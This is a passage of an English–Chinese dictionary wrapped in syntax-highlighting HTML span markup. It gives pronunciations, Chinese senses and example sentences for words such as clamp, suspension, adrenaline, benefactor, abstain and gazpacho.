&lt;span class="n"&gt;KK&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="err"&gt;əˋ&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="err"&gt;ʒ&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="err"&gt;ɪ&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;DJ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="err"&gt;əˋ&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="err"&gt;ʒ&lt;/span&gt;&lt;span class="n"&gt;ain&lt;/span&gt;&lt;span class="err"&gt;ə&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;形容詞&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;【解】陰道的&lt;/span&gt;  
  &lt;span class="mf"&gt;2.&lt;/span&gt; &lt;span class="err"&gt;【植】葉鞘的&lt;/span&gt;  


&lt;span class="n"&gt;clamp&lt;/span&gt;  
&lt;span class="n"&gt;KK&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;kl&lt;/span&gt;&lt;span class="err"&gt;æ&lt;/span&gt;&lt;span class="n"&gt;mp&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;DJ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;kl&lt;/span&gt;&lt;span class="err"&gt;æ&lt;/span&gt;&lt;span class="n"&gt;mp&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;名詞&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;螺絲鉗，鐵箍，夾鉗&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="n"&gt;vt&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;及物動詞&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;鉗緊；夾住&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;O&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
    &lt;span class="n"&gt;Clamp&lt;/span&gt; &lt;span class="n"&gt;these&lt;/span&gt; &lt;span class="n"&gt;two&lt;/span&gt; &lt;span class="n"&gt;pieces&lt;/span&gt; &lt;span class="n"&gt;of&lt;/span&gt; &lt;span class="n"&gt;wood&lt;/span&gt; &lt;span class="n"&gt;together&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;  
    &lt;span class="err"&gt;把兩根木頭鉗緊。&lt;/span&gt;  
  &lt;span class="mf"&gt;2.&lt;/span&gt; &lt;span class="err"&gt;【美】強行實施；強加&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;（&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;down&lt;/span&gt; &lt;span class="n"&gt;on&lt;/span&gt;&lt;span class="err"&gt;）&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
    &lt;span class="n"&gt;clamp&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;curfew&lt;/span&gt; &lt;span class="n"&gt;on&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;town&lt;/span&gt;  
    &lt;span class="err"&gt;對該城鎮強制實行宵禁&lt;/span&gt;  
&lt;span class="n"&gt;vi&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;不及物動詞&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;【美】強行壓制（或限制），取締&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;down&lt;/span&gt; &lt;span class="n"&gt;on&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
    &lt;span class="n"&gt;They&lt;/span&gt; &lt;span class="n"&gt;clamp&lt;/span&gt; &lt;span class="n"&gt;down&lt;/span&gt; &lt;span class="n"&gt;on&lt;/span&gt; &lt;span class="n"&gt;pickpockets&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;  
    &lt;span class="err"&gt;他們嚴禁扒竊。&lt;/span&gt;  


&lt;span class="n"&gt;suspension&lt;/span&gt;  
&lt;span class="n"&gt;KK&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="err"&gt;əˋ&lt;/span&gt;&lt;span class="n"&gt;sp&lt;/span&gt;&lt;span class="err"&gt;ɛ&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="err"&gt;ʃə&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;DJ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="err"&gt;ə&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="err"&gt;ˋ&lt;/span&gt;&lt;span class="n"&gt;pen&lt;/span&gt;&lt;span class="err"&gt;ʃə&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;名詞&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;懸掛，懸吊；懸浮；懸置&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;U&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
  &lt;span class="mf"&gt;2.&lt;/span&gt; &lt;span class="err"&gt;暫停；中止；停職；停學&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;U&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="err"&gt;（&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;of&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;from&lt;/span&gt;&lt;span class="err"&gt;）&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
    &lt;span class="n"&gt;I&lt;/span&gt; &lt;span class="n"&gt;think&lt;/span&gt; &lt;span class="n"&gt;her&lt;/span&gt; &lt;span class="n"&gt;suspension&lt;/span&gt; &lt;span class="n"&gt;from&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;team&lt;/span&gt; &lt;span class="n"&gt;was&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;very&lt;/span&gt; &lt;span class="n"&gt;harsh&lt;/span&gt; &lt;span class="n"&gt;punishment&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;  
    &lt;span class="err"&gt;我認為她被暫停參加隊的比賽是很嚴厲的處罰。&lt;/span&gt;  
  &lt;span class="mf"&gt;3.&lt;/span&gt; &lt;span class="err"&gt;（判斷）暫不作出；（刑罰）暫緩執行；暫停支付&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;U&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="err"&gt;（&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;of&lt;/span&gt;&lt;span class="err"&gt;）&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
  &lt;span class="mf"&gt;4.&lt;/span&gt; &lt;span class="err"&gt;懸置機構；懸架&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
  &lt;span class="mf"&gt;5.&lt;/span&gt; &lt;span class="err"&gt;【化】懸浮體；懸浮液&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
  &lt;span class="mf"&gt;6.&lt;/span&gt; &lt;span class="err"&gt;【音】延留法；延留音&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;U&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  


&lt;span class="n"&gt;bondage&lt;/span&gt;  
&lt;span class="n"&gt;KK&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;ˋ&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="err"&gt;ɑ&lt;/span&gt;&lt;span class="n"&gt;nd&lt;/span&gt;&lt;span class="err"&gt;ɪ&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="err"&gt;ʒ&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;DJ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;ˋ&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="err"&gt;ɔ&lt;/span&gt;&lt;span class="n"&gt;ndid&lt;/span&gt;&lt;span class="err"&gt;ʒ&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="n"&gt;n&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;U&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="err"&gt;不可數名詞&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;奴隸身分&lt;/span&gt;  
  &lt;span class="mf"&gt;2.&lt;/span&gt; &lt;span class="err"&gt;奴役；束縛&lt;/span&gt;  
  &lt;span class="mf"&gt;3.&lt;/span&gt; &lt;span class="err"&gt;受勢力（或影響等）奴役&lt;/span&gt;  
    &lt;span class="n"&gt;A&lt;/span&gt; &lt;span class="n"&gt;drunkard&lt;/span&gt; &lt;span class="n"&gt;is&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="n"&gt;bondage&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;alcohol&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;  
    &lt;span class="err"&gt;酒鬼是酒的奴隸。&lt;/span&gt;  


&lt;span class="n"&gt;sweetener&lt;/span&gt;  
&lt;span class="n"&gt;KK&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;ˋ&lt;/span&gt;&lt;span class="n"&gt;switn&lt;/span&gt;&lt;span class="err"&gt;ɚ&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;DJ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;ˋ&lt;/span&gt;&lt;span class="nl"&gt;swi&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;tn&lt;/span&gt;&lt;span class="err"&gt;ə&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;名詞&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;增甜劑；糖精&lt;/span&gt;  
  &lt;span class="mf"&gt;2.&lt;/span&gt; &lt;span class="err"&gt;甜頭；好處&lt;/span&gt;  


&lt;span class="n"&gt;completion&lt;/span&gt;  
&lt;span class="n"&gt;KK&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="err"&gt;ə&lt;/span&gt;&lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="err"&gt;ˋ&lt;/span&gt;&lt;span class="n"&gt;pli&lt;/span&gt;&lt;span class="err"&gt;ʃə&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;DJ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="err"&gt;ə&lt;/span&gt;&lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="err"&gt;ˋ&lt;/span&gt;&lt;span class="nl"&gt;pli&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="err"&gt;ʃə&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;名詞&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;完成，結束&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;U&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
  &lt;span class="mf"&gt;2.&lt;/span&gt; &lt;span class="err"&gt;圓滿；實現&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;U&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
    &lt;span class="n"&gt;His&lt;/span&gt; &lt;span class="n"&gt;desires&lt;/span&gt; &lt;span class="n"&gt;reached&lt;/span&gt; &lt;span class="n"&gt;completion&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;  
    &lt;span class="err"&gt;他的心願實現了。&lt;/span&gt;  
  &lt;span class="mf"&gt;3.&lt;/span&gt; &lt;span class="err"&gt;【美】【橄】成功前傳&lt;/span&gt;  


&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="err"&gt;·&lt;/span&gt;&lt;span class="n"&gt;dren&lt;/span&gt;&lt;span class="err"&gt;·&lt;/span&gt;&lt;span class="n"&gt;al&lt;/span&gt;&lt;span class="err"&gt;·&lt;/span&gt;&lt;span class="n"&gt;ine&lt;/span&gt;  
&lt;span class="n"&gt;IPA&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;əˈ&lt;/span&gt;&lt;span class="n"&gt;dren&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;ə&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="err"&gt;ə&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;名詞&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;hormone&lt;/span&gt; &lt;span class="n"&gt;secreted&lt;/span&gt; &lt;span class="n"&gt;by&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;adrenal&lt;/span&gt; &lt;span class="n"&gt;glands&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;especially&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="n"&gt;conditions&lt;/span&gt; &lt;span class="n"&gt;of&lt;/span&gt; &lt;span class="n"&gt;stress&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;increasing&lt;/span&gt; &lt;span class="n"&gt;rates&lt;/span&gt; &lt;span class="n"&gt;of&lt;/span&gt;  
 &lt;span class="n"&gt;blood&lt;/span&gt; &lt;span class="n"&gt;circulation&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;breathing&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;and&lt;/span&gt; &lt;span class="n"&gt;carbohydrate&lt;/span&gt; &lt;span class="n"&gt;metabolism&lt;/span&gt; &lt;span class="n"&gt;and&lt;/span&gt; &lt;span class="n"&gt;preparing&lt;/span&gt; &lt;span class="n"&gt;muscles&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;exertion&lt;/span&gt;  
    &lt;span class="n"&gt;performing&lt;/span&gt; &lt;span class="n"&gt;live&lt;/span&gt; &lt;span class="n"&gt;really&lt;/span&gt; &lt;span class="n"&gt;gets&lt;/span&gt; &lt;span class="n"&gt;your&lt;/span&gt; &lt;span class="n"&gt;adrenaline&lt;/span&gt; &lt;span class="n"&gt;going&lt;/span&gt;  
  &lt;span class="mf"&gt;2.&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;hormone&lt;/span&gt; &lt;span class="n"&gt;epinephrine&lt;/span&gt; &lt;span class="n"&gt;extracted&lt;/span&gt; &lt;span class="n"&gt;from&lt;/span&gt; &lt;span class="n"&gt;animals&lt;/span&gt; &lt;span class="n"&gt;or&lt;/span&gt; &lt;span class="n"&gt;prepared&lt;/span&gt; &lt;span class="n"&gt;synthetically&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;medicinal&lt;/span&gt; &lt;span class="n"&gt;purposes&lt;/span&gt;  


&lt;span class="n"&gt;valedictory&lt;/span&gt;  
&lt;span class="n"&gt;KK&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;͵&lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="err"&gt;æ&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="err"&gt;əˋ&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="err"&gt;ɪ&lt;/span&gt;&lt;span class="n"&gt;kt&lt;/span&gt;&lt;span class="err"&gt;ə&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="err"&gt;ɪ&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;DJ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;͵&lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="err"&gt;æ&lt;/span&gt;&lt;span class="n"&gt;li&lt;/span&gt;&lt;span class="err"&gt;ˋ&lt;/span&gt;&lt;span class="n"&gt;dikt&lt;/span&gt;&lt;span class="err"&gt;ə&lt;/span&gt;&lt;span class="n"&gt;ri&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;形容詞&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;【美】告別的&lt;/span&gt;  
&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;名詞&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;（畢業生代表的）告別演講；告別辭&lt;/span&gt;  


&lt;span class="n"&gt;benefactor&lt;/span&gt;  
&lt;span class="n"&gt;KK&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;ˋ&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="err"&gt;ɛ&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="err"&gt;ə͵&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="err"&gt;æ&lt;/span&gt;&lt;span class="n"&gt;kt&lt;/span&gt;&lt;span class="err"&gt;ɚ&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;DJ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;ˋ&lt;/span&gt;&lt;span class="n"&gt;beni&lt;/span&gt;&lt;span class="err"&gt;͵&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="err"&gt;æ&lt;/span&gt;&lt;span class="n"&gt;kt&lt;/span&gt;&lt;span class="err"&gt;ə&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;名詞&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;捐助人；施主；恩人&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
    &lt;span class="n"&gt;This&lt;/span&gt; &lt;span class="n"&gt;orphanage&lt;/span&gt; &lt;span class="n"&gt;has&lt;/span&gt; &lt;span class="n"&gt;many&lt;/span&gt; &lt;span class="n"&gt;benefactors&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;  
    &lt;span class="err"&gt;這所孤兒院有許多施主。&lt;/span&gt;  


&lt;span class="n"&gt;eradicate&lt;/span&gt;  
&lt;span class="n"&gt;KK&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;ɪˋ&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="err"&gt;æ&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="err"&gt;ɪ͵&lt;/span&gt;&lt;span class="n"&gt;ket&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;DJ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="err"&gt;ˋ&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="err"&gt;æ&lt;/span&gt;&lt;span class="n"&gt;dikeit&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="n"&gt;vt&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;及物動詞&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;連根拔除，根絕；消滅&lt;/span&gt;  
    &lt;span class="n"&gt;eradicate&lt;/span&gt; &lt;span class="n"&gt;crime&lt;/span&gt;  
    &lt;span class="err"&gt;根絕犯罪&lt;/span&gt;  


&lt;span class="n"&gt;abstain&lt;/span&gt;  
&lt;span class="n"&gt;KK&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;ə&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="err"&gt;ˋ&lt;/span&gt;&lt;span class="n"&gt;sten&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;DJ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;ə&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="err"&gt;ˋ&lt;/span&gt;&lt;span class="n"&gt;stein&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="n"&gt;vi&lt;/span&gt;&lt;span class="p"&gt;.[(&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;from&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;戒；避免；避開&lt;/span&gt;  
    &lt;span class="n"&gt;The&lt;/span&gt; &lt;span class="n"&gt;doctor&lt;/span&gt; &lt;span class="n"&gt;asked&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;patient&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;abstain&lt;/span&gt; &lt;span class="n"&gt;from&lt;/span&gt; &lt;span class="n"&gt;smoking&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;  
    &lt;span class="err"&gt;醫生叫這位病人戒菸。&lt;/span&gt;  
  &lt;span class="mf"&gt;2.&lt;/span&gt; &lt;span class="err"&gt;棄權&lt;/span&gt;  
    &lt;span class="n"&gt;Some&lt;/span&gt; &lt;span class="n"&gt;voters&lt;/span&gt; &lt;span class="n"&gt;abstained&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;election&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;  
    &lt;span class="err"&gt;一些選民在選舉中棄了權。&lt;/span&gt;  


&lt;span class="n"&gt;diligence&lt;/span&gt;  
&lt;span class="n"&gt;KK&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;ˋ&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="err"&gt;ɪ&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="err"&gt;ə&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="err"&gt;ʒə&lt;/span&gt;&lt;span class="n"&gt;ns&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;DJ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;ˋ&lt;/span&gt;&lt;span class="n"&gt;dilid&lt;/span&gt;&lt;span class="err"&gt;ʒə&lt;/span&gt;&lt;span class="n"&gt;ns&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="n"&gt;n&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;U&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="err"&gt;不可數名詞&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;勤勉，勤奮&lt;/span&gt;  
    &lt;span class="n"&gt;Does&lt;/span&gt; &lt;span class="n"&gt;he&lt;/span&gt; &lt;span class="n"&gt;have&lt;/span&gt; &lt;span class="n"&gt;enough&lt;/span&gt; &lt;span class="n"&gt;diligence&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;finish&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;job&lt;/span&gt; &lt;span class="n"&gt;on&lt;/span&gt; &lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;?&lt;/span&gt;  
    &lt;span class="err"&gt;他是否很勤奮，能及時完成這項工作？&lt;/span&gt;  
  &lt;span class="mf"&gt;2.&lt;/span&gt; &lt;span class="err"&gt;【律】注意的程度&lt;/span&gt;  
  &lt;span class="mf"&gt;3.&lt;/span&gt; &lt;span class="err"&gt;【廢】匆忙，迅速&lt;/span&gt;  


&lt;span class="n"&gt;gazpacho&lt;/span&gt;  
&lt;span class="n"&gt;KK&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;g&lt;/span&gt;&lt;span class="err"&gt;ɑ&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="err"&gt;ˋ&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="err"&gt;ɑ&lt;/span&gt;&lt;span class="n"&gt;ko&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;DJ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;g&lt;/span&gt;&lt;span class="err"&gt;ɑ&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="err"&gt;ˋ&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="err"&gt;ɑ&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="err"&gt;ə&lt;/span&gt;&lt;span class="n"&gt;u&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;名詞&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;西班牙涼菜湯（把菜切碎，加油、醋等）&lt;/span&gt;  


